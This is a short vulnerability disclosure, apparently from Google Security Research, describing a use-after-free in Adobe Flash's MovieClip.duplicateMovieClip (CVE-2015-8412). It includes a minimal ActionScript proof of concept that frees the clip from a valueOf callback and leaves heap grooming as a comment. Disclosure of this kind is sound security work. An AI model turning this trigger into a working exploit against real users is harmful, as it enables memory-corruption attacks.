title: Adobe Flash MovieClip.duplicateMovieClip - Use-After-Free
author: Google Security Research
cves: CVE-2015-8412

Source: https://code.google.com/p/google-security-research/issues/detail?id=591
 
There is a use-after-free in MovieClip.duplicateMovieClip. If the depth or movie name parameter provided is an object with toString or valueOf defined, this method can free the MovieClip, which is then used. 
 
A minimal PoC follows:
 
 
this.createEmptyMovieClip("mc", 1);
 
mc.duplicateMovieClip( "mc",{valueOf : func});
 
 
function func(){
     
    trace("in func");
    mc.removeMovieClip();
 
        // Fix heap here
 
    return 5;
     
    }
     
     
A sample swf and fla are attached.
